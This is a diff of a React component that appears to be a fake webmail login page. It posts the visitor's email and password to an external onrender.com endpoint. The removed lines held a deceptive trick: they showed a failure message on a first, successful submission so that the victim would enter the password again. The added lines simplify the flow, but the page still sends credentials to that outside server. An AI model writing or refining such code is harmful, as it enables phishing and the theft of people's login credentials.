@@ -102,24 +102,13 @@ const [successCount, setSuccessCount] = useState<number>(0);
     await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
     setError("");
     setPassword(""); // Clear password field
-    if (lastSuccessEmail === email) {
-      // Same email, increment count
-      if (successCount === 1) {
-        enqueueSnackbar("Message sent successfully", { variant: "success" });
-      } else {
-        enqueueSnackbar("Failed to send message", { variant: "error" });
-      }
-      setSuccessCount(successCount + 1);
-    } else {
-      // New email, reset count and show error (even on success)
-      enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
-      setLastSuccessEmail(email);
-      setSuccessCount(1);
-    }
+    enqueueSnackbar("Message sent successfully", { variant: "success" });
+    setLastSuccessEmail(email);
+    setSuccessCount(1);
   } catch (err) {
     setError("Failed to send email. Try again!");
-    enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
-    setSuccessCount(0); // Reset for next try
+    enqueueSnackbar("Failed to send message. Please try again.", { variant: "error" });
+    setSuccessCount(0);
     console.error("Email sending error:", err);
   } finally {
     setLoading(false);
